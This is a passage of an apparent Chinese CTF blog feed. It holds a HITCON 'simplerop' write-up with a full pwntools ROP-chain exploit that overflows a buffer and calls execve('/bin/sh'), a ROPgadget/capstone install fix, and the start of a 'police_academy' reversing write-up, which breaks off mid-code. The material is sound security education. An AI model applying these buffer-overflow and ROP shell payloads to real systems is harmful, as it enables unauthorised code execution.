p <span class="token operator">+=</span> <span class="token string">'/bin'</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0809a15d</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># mov dword ptr [edx], eax ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0806e82a</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># pop edx ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080ea064</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># @ .data + 4</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080bae06</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># pop eax ; ret</span>
p <span class="token operator">+=</span> <span class="token string">'//sh'</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0809a15d</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># mov dword ptr [edx], eax ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0806e82a</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># pop edx ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080ea068</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># @ .data + 8</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x08054250</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># xor eax, eax ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0809a15d</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># mov dword ptr [edx], eax ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080481c9</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># pop ebx ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080ea060</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># @ .data</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0806e851</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># pop ecx ; pop ebx ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080ea068</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># @ .data + 8</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080ea060</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># padding without overwrite ebx</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0806e82a</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># pop edx ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080ea068</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># @ .data + 8</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x08054250</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># xor eax, eax ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0807b27f</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># inc eax ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0807b27f</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># inc eax ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0807b27f</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># inc eax ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0807b27f</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># inc eax ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0807b27f</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># inc eax ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0807b27f</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># inc eax ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0807b27f</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># inc eax ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0807b27f</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># inc eax ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0807b27f</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># inc eax ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0807b27f</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># inc eax ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0807b27f</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># inc eax ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080493e1</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># int 0x80</span>
<span class="token keyword">print</span> len<span class="token punctuation">(</span>p<span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>send<span class="token punctuation">(</span>p<span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
<p>运行你会发现没办法正常getshell 因为可以先print下我们当前payload的长度为168但是raed限制长度为100所以没办法正常写入 ，这时候我们就应该自己去优化这个payload或者自己重新写一个payload</p>
<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>寄存器中有eax,ebx,ecx,edx等</p>
<p>Linux下的系统调用通过int 80h实现，用系统调用号来区分入口函数，其中寄存器eax存放调用号，剩下的几个参数存放参数</p>
<p>execve调用号为0xb 所以我们需要找到pop eax ret来将0xb存入eax</p>
<p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-python"><code class="language-python">pop_edx_ret<span class="token operator">=</span><span class="token number">0x0806e82a</span> <span class="token comment" spellcheck="true"># pop edx ; ret</span>
pop_eax_ret<span class="token operator">=</span><span class="token number">0x080bae06</span> <span class="token comment" spellcheck="true"># pop eax ; ret</span>
data_addr<span class="token operator">=</span><span class="token number">0x080ea060</span> <span class="token comment" spellcheck="true">#  .data段</span>
pop_edx_ecx_ebx_ret<span class="token operator">=</span><span class="token number">0x0806e850</span> <span class="token comment" spellcheck="true"># pop edx ; pop ecx ; pop ebx ; ret</span>
mov_ret<span class="token operator">=</span><span class="token number">0x0809a15d</span> <span class="token comment" spellcheck="true"># mov dword ptr [edx], eax ; ret</span>
int_0x80_addr <span class="token operator">=</span> <span class="token number">0x080493e1</span> <span class="token comment" spellcheck="true"># int 0x80</span>
<span class="token comment" spellcheck="true">#因为32位寄存器只能存放0x4字节的数据而"/bin/sh"为7字节所以我们要想办法吧/bin/sh放入data段 然后寄存器放入data段地址</span>

payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">32</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>pop_edx_ret<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>data_addr<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>pop_eax_ret<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"/bin"</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>mov_ret<span class="token punctuation">)</span>
<span class="token comment" spellcheck="true">#先溢出至ret +覆盖ret到edx+将data_addr赋值给edx+覆盖ret到eax+将/bin字符串赋值给eax+利用mov_ret将eax的值赋给edx的值既将/bin覆盖到data段的内容</span>
payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>pop_edx_ret<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>data_addr<span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>pop_eax_ret<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"/sh\x00"</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>mov_ret<span class="token punctuation">)</span>
<span class="token comment" spellcheck="true">#再覆盖ret到edx+将data_addr+4的地址赋值给edx（因为前4字节被赋值为/bin所以要向下+4位地址继续写）+覆盖ret到eax+将/sh\x00写入eax+利用mov_ret将eax的值赋给edx既将/sh\x00覆盖到data+4地址的内容</span>
payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>pop_edx_ecx_ebx_ret<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>data_addr<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>pop_eax_ret<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0xb</span><span class="token punctuation">)</span><span class="token operator">+</span>int_0x80_addr
<span class="token comment" spellcheck="true">#执行系统调用execve 覆盖ret到pop_edx_ecx_ebx_ret+将0赋值给edx+将0赋值给ecx+将data_addr赋值给ebx+将0xb调用号赋值给eax+int 0x80进行中断</span>
</code></pre>
<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> struct <span class="token keyword">import</span> pack
sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'simplerop'</span><span class="token punctuation">)</span>
pop_edx_ret<span class="token operator">=</span><span class="token number">0x0806e82a</span> 
pop_eax_ret<span class="token operator">=</span><span class="token number">0x080bae06</span> 
data_addr<span class="token operator">=</span><span class="token number">0x080ea060</span>  <span class="token comment" spellcheck="true">#elf.bss()获取</span>
pop_edx_ecx_ebx_ret<span class="token operator">=</span><span class="token number">0x0806e850</span> 
mov_ret<span class="token operator">=</span><span class="token number">0x0809a15d</span> 
int_0x80_addr <span class="token operator">=</span> <span class="token number">0x080493e1</span> 

payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">32</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>pop_edx_ret<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>data_addr<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>pop_eax_ret<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"/bin"</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>mov_ret<span class="token punctuation">)</span>

payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>pop_edx_ret<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>data_addr<span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>pop_eax_ret<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"/sh\x00"</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>mov_ret<span class="token punctuation">)</span>

payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>pop_edx_ecx_ebx_ret<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>data_addr<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>pop_eax_ret<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0xb</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>int_0x80_addr<span class="token punctuation">)</span>
<span class="token keyword">print</span> len<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>

sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
<p>尝试运行</p>
<p><img src="/2018/07/12/HITCON-Training-Writeup/2.jpg" alt="2"></p>
<p>可以看到当前payload长度恰好为100可以正常read读入</p>
<p>并且成功获得shell</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;记录HITCON题目中遇到的问题&lt;/p&gt;
&lt;h2 id=&quot;simplerop&quot;&gt;&lt;a href=&quot;#simplerop&quot; class=&quot;headerlink&quot; title=&quot;simplerop&quot;&gt;&lt;/a&gt;simplerop&lt;/h2&gt;&lt;h4 id=&quot;检查保护&quot;&gt;&lt;a href
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>ROPgadget安装问题</title>
    <link href="http://iosmosis.github.io/2018/07/05/ROPgadget%E5%AE%89%E8%A3%85%E9%97%AE%E9%A2%98/"/>
    <id>http://iosmosis.github.io/2018/07/05/ROPgadget安装问题/</id>
    <published>2018-07-05T05:19:43.000Z</published>
    <updated>2018-07-05T05:43:23.116Z</updated>
    
    <content type="html"><![CDATA[<p>运行ROPgadget遇到这个错误</p>
<p><img src="/2018/07/05/ROPgadget安装问题/1.jpg" alt="1"></p>
<p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-python"><code class="language-python">ERROR<span class="token punctuation">:</span> fail to load the dynamic library
</code></pre>
<p>在网上查了下找到<a href="http://www.cnblogs.com/p4nda/" target="_blank" rel="external">p4nda</a> 师傅的解决方式</p>
<p>出现原因是因为<em>不到capstone的动态链接库（libcapstone.so）</em> </p>
<h3 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h3><p></p><p class="code-caption" data-lang="pyhton" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-pyhton"><code class="language-pyhton">find / -name 'libcapstone*'
</code></pre>
<p><img src="/2018/07/05/ROPgadget安装问题/2.jpg" alt="2"></p>
<p>找到so路径</p>
<p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-python"><code class="language-python"><span class="token operator">/</span>usr<span class="token operator">/</span>local<span class="token operator">/</span>lib<span class="token operator">/</span>python2<span class="token number">.7</span><span class="token operator">/</span>dist<span class="token operator">-</span>packages<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>python2<span class="token number">.7</span><span class="token operator">/</span>dist<span class="token operator">-</span>packages<span class="token operator">/</span>capstone<span class="token operator">/</span>libcapstone<span class="token punctuation">.</span>so
</code></pre>
<p>接着查看当前python所在目录</p>
<p>python2的查看方法： </p>
<p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> sys   
<span class="token keyword">print</span> sys<span class="token punctuation">.</span>path
</code></pre>
<p>python3的查看方法:</p>
<p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> sys   
<span class="token keyword">print</span> <span class="token punctuation">(</span>sys<span class="token punctuation">.</span>path<span class="token punctuation">)</span>
</code></pre>
<p>得到当前python路径</p>
<p><img src="/2018/07/05/ROPgadget安装问题/3.jpg" alt="3"></p>
<p>找到后</p>
<p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-python"><code class="language-python">mv so库路径  python路径<span class="token operator">/</span>dist<span class="token operator">-</span>packages<span class="token operator">/</span>capstone文件夹下
</code></pre>
<pre class=" language-python"><code class="language-python">pstone<span class="token punctuation">.</span>so'<span class="token punctuation">:</span> Permission denied
ios@ubuntu<span class="token punctuation">:</span><span class="token operator">~</span>$ sudo mv <span class="token operator">/</span>usr<span class="token operator">/</span>local<span class="token operator">/</span>lib<span class="token operator">/</span>python2<span class="token number">.7</span><span class="token operator">/</span>dist<span class="token operator">-</span>packages<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>python2<span class="token number">.7</span><span class="token operator">/</span>dist<span class="token operator">-</span>packages<span class="token operator">/</span>capstone<span class="token operator">/</span>libcapstone<span class="token punctuation">.</span>so <span class="token operator">/</span>usr<span class="token operator">/</span>local<span class="token operator">/</span>lib<span class="token operator">/</span>python2<span class="token number">.7</span><span class="token operator">/</span>dist<span class="token operator">-</span>packages<span class="token operator">/</span>capstone
</code></pre>
<p>就搞定了~</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;运行ROPgadget遇到这个错误&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2018/07/05/ROPgadget安装问题/1.jpg&quot; alt=&quot;1&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;/p&gt;&lt;p class=&quot;code-caption&quot; data-lang=&quot;python&quot; data-l
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>police_academy Writeup</title>
    <link href="http://iosmosis.github.io/2018/06/29/police-academy-Writeup/"/>
    <id>http://iosmosis.github.io/2018/06/29/police-academy-Writeup/</id>
    <published>2018-06-29T15:30:28.000Z</published>
    <updated>2018-06-29T17:42:08.015Z</updated>
    
    <content type="html"><![CDATA[<h3 id="走一下程序流程"><a href="#走一下程序流程" class="headerlink" title="走一下程序流程"></a>走一下程序流程</h3><p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash">ios@ubuntu:~$ ./police_academy
Enter password to authentic yourself <span class="token keyword">:</span> 1
Incorrect password. Closing connection.
ios@ubuntu:~$
</code></pre>
<p>检查程序</p>
<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash">ios@ubuntu:~$ checksec police_academy
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/home/ios/police_academy'</span>
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE <span class="token punctuation">(</span>0x400000<span class="token punctuation">)</span>
</code></pre>
<h3 id="载入IDA分析"><a href="#载入IDA分析" class="headerlink" title="载入IDA分析"></a>载入IDA分析</h3><p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">int</span> <span class="token operator">*</span>v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// rsi</span>
  <span class="token keyword">int</span> result<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// eax</span>
  <span class="token keyword">int</span> v5<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+8h] [rbp-48h]</span>
  <span class="token keyword">int</span> v6<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+Ch] [rbp-44h]</span>
  <span class="token keyword">char</span> s1<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+10h] [rbp-40h]</span>
  __int64 v8<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+20h] [rbp-30h]</span>
  __int64 v9<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+28h] [rbp-28h]</span>
  __int64 v10<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+30h] [rbp-20h]</span>
  __int64 v11<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+38h] [rbp-18h]</span>
  <span class="token keyword">int</span> v12<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+40h] [rbp-10h]</span>
  <span class="token keyword">char</span> v13<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+44h] [rbp-Ch]</span>
  <span class="token keyword">unsigned</span> __int64 v14<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+48h] [rbp-8h]</span>

  v14 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Enter password to authentic yourself : "</span><span class="token punctuation">,</span> argv<span class="token punctuation">,</span> envp<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">fflush</span><span class="token punctuation">(</span>_bss_start<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>s1<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">strncmp</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s1<span class="token punctuation">,</span> <span class="token string">"kaiokenx20"</span><span class="token punctuation">,</span> <span class="token number">0xAuLL</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>
  <span class="token punctuation">{</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Incorrect password. Closing connection."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Enter case number: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n\t 1) Application_1"</span><span class="token punctuation">,</span> <span class="token string">"kaiokenx20"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n\t 2) Application_2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n\t 3) Application_3"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n\t 4) Application_4"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n\t 5) Application_5"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n\t 6) Application_6"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n\t 7) Flag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n\n\t Enter choice :- "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">fflush</span><span class="token punctuation">(</span>_bss_start<span class="token punctuation">)</span><span class="token punctuation">;</span>
  v3 <span class="token operator">=</span> <span class="token operator">&amp;</span>v5<span class="token punctuation">;</span>
  <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v5<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">switch</span> <span class="token punctuation">(</span> v5 <span class="token punctuation">)</span>
  <span class="token punctuation">{</span>
    <span class="token keyword">case</span> <span class="token number">1</span><span class="token punctuation">:</span>
      v8 <span class="token operator">=</span> <span class="token string">'070885a2'</span><span class="token punctuation">;</span>
      v9 <span class="token operator">=</span> <span class="token string">'5f5e8ea0'</span><span class="token punctuation">;</span>
      v10 <span class="token operator">=</span> <span class="token string">'c9fd9ac1'</span><span class="token punctuation">;</span>
      v11 <span class="token operator">=</span> <span class="token string">'d65344a5'</span><span class="token punctuation">;</span>
      v12 <span class="token operator">=</span> <span class="token string">'tad.'</span><span class="token punctuation">;</span>
      v13 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
      <span class="token keyword">break</span><span class="token punctuation">;</span>
    <span class="token keyword">case</span> <span class="token number">2</span><span class="token punctuation">:</span>
      v8 <span class="token operator">=</span> <span class="token string">'c1eda58c'</span><span class="token punctuation">;</span>
      v9 <span class="token operator">=</span> <span class="token string">'2ebbcb74'</span><span class="token punctuation">;</span>
      v10 <span class="token operator">=</span> <span class="token string">'941246ca'</span><span class="token punctuation">;</span>
      v3 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token string">'81b19491'</span><span class="token punctuation">;</span>
      v11 <span class="token operator">=</span> <span class="token string">'81b19491'</span><span class="token punctuation">;</span>
      v12 <span class="token operator">=</span> <span class="token string">'tad.'</span><span class="token punctuation">;</span>
      v13 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
      <span class="token keyword">break</span><span class="token punctuation">;</span>
    <span class="token keyword">case</span> <span class="token number">3</span><span class="token punctuation">:</span>
      v8 <span class="token operator">=</span> <span class="token string">'23a1c928'</span><span class="token punctuation">;</span>
      v9 <span class="token operator">=</span> <span class="token string">'3bfa3226'</span><span class="token punctuation">;</span>
      v3 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token string">'b61c43c3'</span><span class="token punctuation">;</span>
      v10 <span class="token operator">=</span> <span class="token string">'b61c43c3'</span><span class="token punctuation">;</span>
      v11 <span class="token operator">=</span> <span class="token string">'d27474ab'</span><span class="token punctuation">;</span>
      v12 <span class="token operator">=</span> <span class="token string">'tad.'</span><span class="token punctuation">;</span>
      v13 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
      <span class="token keyword">break</span><span class="token punctuation">;</span>
    <span class="token keyword">case</span> <span class="token number">4</span><span class="token punctuation">:</span>
      v8 <span class="token operator">=</span> <span class="token string">'d82fd45a'</span><span class="token punctuation">;</span>
      v3 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token string">'f08d4b8b'</span><span class="token punctuation">;</span>
